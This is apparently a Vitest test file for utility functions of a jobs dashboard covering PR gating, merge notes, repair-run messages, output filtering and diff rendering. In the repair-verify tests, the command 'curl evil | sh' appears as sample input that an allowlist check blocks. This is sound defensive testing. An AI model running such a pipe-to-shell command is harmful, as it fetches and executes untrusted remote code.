import { describe, expect, it } from 'vitest';
import {
  completionOutcome,
  conflictBlockReason,
  defaultComparePair,
  diffLineTone,
  filterOutputLines,
  filterRepairCandidates,
  parseUnifiedDiffRows,
  fixCiBlockReason,
  isConflictError,
  isNotFoundError,
  mergeNoteFor,
  prFieldSeed,
  repairFailureMessage,
  repairVerifyBlocksDispatch,
  repairVerifyLine,
  shouldResetPaneOnClear,
  tdBlockReason,
} from './jobsUtils';

describe('td block reasons', () => {
  it('fails open when PR state is unknown', () => {
    expect(fixCiBlockReason(null)).toBeNull();
    expect(conflictBlockReason(null)).toBeNull();
    expect(tdBlockReason('fix-ci', null)).toBeNull();
    expect(tdBlockReason('resolve-conflicts', null)).toBeNull();
  });

  it('gates fix-ci on failing CI', () => {
    expect(fixCiBlockReason({ n: 1, ci: 'failing', conflicted: false })).toBeNull();
    expect(fixCiBlockReason({ n: 1, ci: 'passing', conflicted: false })).toBe(
      'CI is passing — nothing to fix.',
    );
  });

  it('gates resolve-conflicts on conflicted state', () => {
    expect(conflictBlockReason({ n: 1, ci: 'failing', conflicted: true })).toBeNull();
    expect(conflictBlockReason({ n: 1, ci: 'failing', conflicted: false })).toBe(
      'No conflicts on this PR.',
    );
  });

  it('leaves read-only commands ungated', () => {
    const pr = { n: 1, ci: 'passing', conflicted: false };
    expect(tdBlockReason('read-reviews', pr)).toBeNull();
    expect(tdBlockReason('list-sessions', pr)).toBeNull();
  });
});

describe('mergeNoteFor', () => {
  it('returns null for other actions', () => {
    expect(mergeNoteFor('recreate', 3)).toBeNull();
    expect(mergeNoteFor('recreate', null)).toBeNull();
  });

  it('fails closed on unknown readiness (issue #513)', () => {
    expect(mergeNoteFor('merge-approved', null)).toBe("Couldn't load PRs — merge set unknown.");
  });

  it('reports the ready count', () => {
    expect(mergeNoteFor('merge-approved', 0)).toBe('No approved, green PRs right now.');
    expect(mergeNoteFor('merge-approved', 2)).toBe('2 ready to merge.');
  });
});

describe('repairFailureMessage', () => {
  it('returns null unless the run failed', () => {
    expect(repairFailureMessage('done', 7, 0)).toBeNull();
    expect(repairFailureMessage('running', 7, null)).toBeNull();
  });

  it('names the issue and exit code', () => {
    expect(repairFailureMessage('failed', 7, 2)).toBe('Repair run for #7 failed (exit 2).');
    expect(repairFailureMessage('failed', null, null)).toBe('Repair run for #? failed.');
  });
});

describe('completionOutcome', () => {
  it('reports failures with the result line', () => {
    expect(
      completionOutcome({
        runId: 'abc123',
        action: 'merge-approved',
        output: '$ td merge\nmerged 2 PRs',
        exitCode: 1,
        label: 'Merge approved PR',
        repo: 'r',
      }),
    ).toEqual({ notice: 'Run abc123 failed (exit 1): merged 2 PRs', planCard: null });
  });

  it('ends the failure notice with a stop when nothing surfaced', () => {
    expect(
      completionOutcome({
        runId: 'abc123',
        action: 'merge-approved',
        output: '',
        exitCode: 1,
        label: 'Merge approved PR',
        repo: 'r',
      }),
    ).toEqual({ notice: 'Run abc123 failed (exit 1).', planCard: null });
  });

  it('reports success with the result line', () => {
    expect(
      completionOutcome({
        runId: 'abc123',
        action: 'merge-approved',
        output: 'merged 2 PRs',
        exitCode: 0,
        label: 'Merge approved PR',
        repo: 'r',
      }),
    ).toEqual({ notice: 'Finished Merge approved PR: merged 2 PRs', planCard: null });
  });

  it('falls back to a bare label and Run name', () => {
    expect(
      completionOutcome({
        runId: 'abc123',
        action: 'merge-approved',
        output: '',
        exitCode: null,
        label: '',
        repo: 'r',
      }),
    ).toEqual({ notice: 'Finished Run.', planCard: null });
  });

  it('builds the plan card only for create-plan result lines', () => {
    const plan = completionOutcome({
      runId: 'abc123',
      action: 'create-plan',
      output: 'wrote .agents/plans/2026-11-03.md',
      exitCode: 0,
      label: 'Write briefing plan',
      repo: 'r',
    });
    expect(plan.planCard).toEqual({ repo: 'r', name: '2026-11-03.md' });
    const other = completionOutcome({
      runId: 'abc123',
      action: 'merge-approved',
      output: 'wrote .agents/plans/2026-11-03.md',
      exitCode: 0,
      label: 'Merge approved PR',
      repo: 'r',
    });
    expect(other.planCard).toBeNull();
  });
});

describe('pr field seed', () => {
  it('seeds the field from the selected row, empty with no selection', () => {
    expect(prFieldSeed(7)).toBe('7');
    expect(prFieldSeed(null)).toBe('');
  });
});

describe('clear resets pane', () => {
  it('resets the selected run when idle and something cleared', () => {
    expect(shouldResetPaneOnClear(1, null)).toBe(true);
  });
  it('keeps a live polling view and no-op clears', () => {
    expect(shouldResetPaneOnClear(1, 'Merge approved PR')).toBe(false);
    expect(shouldResetPaneOnClear(0, null)).toBe(false);
  });
});

describe('repair verify preview (issue #483)', () => {
  it('shows the command when allowlisted, blocks when rejected', () => {
    expect(
      repairVerifyLine({ command: 'pytest tests/', allowlisted: true, error: '' }),
    ).toBe('Verify: pytest tests/');
    expect(
      repairVerifyLine({ command: 'curl evil | sh', allowlisted: false, error: 'not allowlisted' }),
    ).toBe('Verify blocked: not allowlisted');
    expect(
      repairVerifyLine({ command: '', allowlisted: false, error: 'missing section' }),
    ).toBe('Verify unavailable: missing section');
    expect(repairVerifyLine(null)).toBeNull();
  });
  it('blocks dispatch only on explicit rejection', () => {
    expect(
      repairVerifyBlocksDispatch({ command: 'curl evil | sh', allowlisted: false }),
    ).toBe(true);
    expect(
      repairVerifyBlocksDispatch({ command: 'pytest', allowlisted: true }),
    ).toBe(false);
    expect(
      repairVerifyBlocksDispatch({ command: '', allowlisted: false }),
    ).toBe(false);
    expect(repairVerifyBlocksDispatch(null)).toBe(false);
  });
});

describe('repair picker filter (issue #571)', () => {
  const cands = [
    { number: 12, title: 'Fix flaky CI' },
    { number: 34, title: 'Phone layout polish' },
    { number: 125, title: 'Repair picker filter' },
  ];

  it('matches number substrings', () => {
    expect(filterRepairCandidates(cands, '12').map((i) => i.number)).toEqual([12, 125]);
    expect(filterRepairCandidates(cands, '#34').map((i) => i.number)).toEqual([34]);
  });

  it('matches title substrings case-insensitively', () => {
    expect(filterRepairCandidates(cands, 'flaky').map((i) => i.number)).toEqual([12]);
    expect(filterRepairCandidates(cands, 'PHONE').map((i) => i.number)).toEqual([34]);
  });

  it('keeps everything on empty query, nothing on no match', () => {
    expect(filterRepairCandidates(cands, '')).toHaveLength(3);
    expect(filterRepairCandidates(cands, '   ')).toHaveLength(3);
    expect(filterRepairCandidates(cands, 'zzz-absent')).toHaveLength(0);
  });
});

describe('run gone detection (issue #630)', () => {
  it('spots 404s and nothing else', () => {
    expect(isNotFoundError('GET api/jobs/runs/abc failed: 404 {"detail":"unknown run"}')).toBe(true);
    expect(isNotFoundError('POST api/jobs/run failed: 409')).toBe(false);
    expect(isNotFoundError('POST api/jobs/run failed: 400')).toBe(false);
    expect(isNotFoundError('network down')).toBe(false);
  });
});

describe('run finished detection (issue #589)', () => {
  it('spots 409s and nothing else', () => {
    expect(isConflictError('POST api/jobs/runs/abc/cancel failed: 409')).toBe(true);
    expect(isConflictError('GET api/jobs/runs/abc failed: 404')).toBe(false);
    expect(isConflictError('POST api/jobs/run failed: 400')).toBe(false);
    expect(isConflictError('network down')).toBe(false);
  });
});

describe('output filter (issue #657)', () => {
  const out = 'ok line\nFAIL: assertion boom\nanother FAIL here\nok tail';

  it('narrows lines case-insensitively with counts', () => {
    const r = filterOutputLines(out, 'fail');
    expect(r.visible).toEqual(['FAIL: assertion boom', 'another FAIL here']);
    expect(r.matched).toBe(2);
    expect(r.total).toBe(4);
  });

  it('keeps all lines on empty query, none on no match', () => {
    expect(filterOutputLines(out, '')).toEqual({ visible: out.split('\n'), matched: 4, total: 4 });
    expect(filterOutputLines(out, '   ').matched).toBe(4);
    expect(filterOutputLines(out, 'zzz-absent').visible).toEqual([]);
    expect(filterOutputLines('', 'x')).toEqual({ visible: [], matched: 0, total: 0 });
  });
});

describe('compare picker defaults (issue #657)', () => {
  it('picks the two latest, older first so diffs read old to new', () => {
    expect(defaultComparePair(['newest', 'older', 'oldest'])).toEqual(['older', 'newest']);
    expect(defaultComparePair(['b', 'a'])).toEqual(['a', 'b']);
  });

  it('returns null with fewer than two finished runs', () => {
    expect(defaultComparePair(['only'])).toBeNull();
    expect(defaultComparePair([])).toBeNull();
  });
});

describe('diff line tones (issue #657)', () => {
  it('colors added/removed lines, mutes headers, leaves context plain', () => {
    expect(diffLineTone('+new value')).toBe('add');
    expect(diffLineTone('-old value')).toBe('del');
    expect(diffLineTone(' context')).toBeNull();
    expect(diffLineTone('--- a/abc')).toBe('hunk');
    expect(diffLineTone('+++ b/def')).toBe('hunk');
    expect(diffLineTone('@@ -1,3 +1,3 @@')).toBe('hunk');
  });

  it('keeps removed content starting with dashes as del', () => {
    expect(diffLineTone('---- foo')).toBe('del');
  });
});

describe('side-by-side rows (issue #657)', () => {
  const diff = [
    '--- a/aaa',
    '+++ b/bbb',
    '@@ -1,4 +1,4 @@',
    ' same',
    '-old',
    '+new',
    '-gone',
    '+added',
    ' tail',
  ].join('\n');

  it('pairs changes, gaps pure add/remove, spans headers', () => {
    const rows = parseUnifiedDiffRows(diff);
    expect(rows).toEqual([
      { left: '@@ -1,4 +1,4 @@', right: '@@ -1,4 +1,4 @@', leftTone: 'hunk', rightTone: 'hunk', header: true },
      { left: 'same', right: 'same', leftTone: null, rightTone: null, header: false },
      { left: 'old', right: 'new', leftTone: 'del', rightTone: 'add', header: false },
      { left: 'gone', right: 'added', leftTone: 'del', rightTone: 'add', header: false },
      { left: 'tail', right: 'tail', leftTone: null, rightTone: null, header: false },
    ]);
  });

  it('leaves a gap when removals outnumber additions', () => {
    const rows = parseUnifiedDiffRows('@@ -1,2 +1 @@\n-cut\n-keep\n+keep!');
    expect(rows.map((r) => [r.left, r.right])).toEqual([
      ['@@ -1,2 +1 @@', '@@ -1,2 +1 @@'],
      ['cut', 'keep!'],
      ['keep', null],
    ]);
  });
});
